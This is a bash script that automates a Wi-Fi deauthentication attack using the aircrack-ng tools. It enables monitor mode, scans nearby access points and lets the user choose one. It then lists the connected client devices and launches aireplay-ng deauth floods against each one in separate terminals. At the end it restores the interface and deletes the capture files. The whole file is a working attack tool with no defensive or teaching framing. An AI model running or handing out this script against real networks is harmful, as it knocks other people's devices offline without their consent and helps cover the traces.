#!/bin/bash

Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
NC='\033[0m'
x=1;

clear
mkdir ~/Desktop/MACS
echo -e "${Green} Starting Monitor Mode on wlo1 ${NC}" 
airmon-ng check kill && airmon-ng start wlo1

airodump-ng wlo1mon -w ~/Desktop/wifi

clear

awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $4}' | sed '1d' > ~/Desktop/MACS/wifi.txt
awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $6}' | sed '1d' > ~/Desktop/MACS/channels.txt

echo -e "${Green} WIFI's around you are: ${NC}"

cat ~/Desktop/MACS/wifi.txt | while read p
do 
	echo "$x: $p"
	x=$(( $x + 1 ))
done

echo -ne  "${Blue}CHOOSE a WIFI: ${White}"
read choice

bssid=`sed "$choice!d" ~/Desktop/MACS/wifi.txt`
channel=`sed "$choice!d" ~/Desktop/MACS/channels.txt`

airodump-ng --bssid $bssid --channel $channel wlo1mon -w ~/Desktop/devices
sed '1,5d' ~/Desktop/devices-01.csv | awk -F "\"*,\"*" '{print $1}' | sed '$d' > ~/Desktop/MACS/devices.txt 

x=2
while [ $x -gt 1 ]
do

	x=1
	echo -e "${Green}Devices to be booted from $bssid"
	echo -e "${Red}-------------------------------------${NC}"
	cat ~/Desktop/MACS/devices.txt | while read p
	do
		echo "$x: $p"
		x=$(( $x + 1 ))
	done
	echo -e "${Green}Press 1 if you want to remove the above devices. Press 2 if you want to prevent a device to get booted.${NC}"
	echo -ne "${Blue}Enter your Choice: ${White}"
	read ch

	if [ $ch -eq 2 ] 
	then 
		echo -e "${Red}-------------------------------------${NC}"
		echo -e "${Blue}Enter the Device's Address for not to be booted: ${White}"
		read mac
		sed -i "/$mac/d" ~/Desktop/MACS/devices.txt 
		echo -e "${Red}-------------------------------------${NC}"
		x=2
	elif [ $ch -eq 1 ] 
	then
		clear
		a=100
		echo -e "${Red}BOOTING the devices${Yellow} NOW"
		cat ~/Desktop/MACS/devices.txt | while read q
		do
			xterm +hold -geometry 91x31+"$a"+500 -e "aireplay-ng --deauth 20 -a $bssid -c $q wlo1mon" & 	
			a=$(( $a + 100 ))
		done
		x=1

		PROCESS="xterm"
		while true
		do
			if pgrep -x "$PROCESS" >/dev/null
			then 
				echo -n -e "${NC}."
				sleep 2
				continue
			else
				echo ""
				echo -e "${Green}Stopping Monitor mode on the interface...${NC}"
				xterm +hold -e "airmon-ng stop wlo1mon && service network-manager restart"
				sleep 2
				echo -e "${Green}Deleting the captured files..."
				sleep 2
				rm -rf ~/Desktop/devices-*
				rm -rf ~/Desktop/wifi-*
				rm -rf ~/Desktop/MACS
				echo -e "${Green}DONE."
				break
			fi
		done

	fi
done

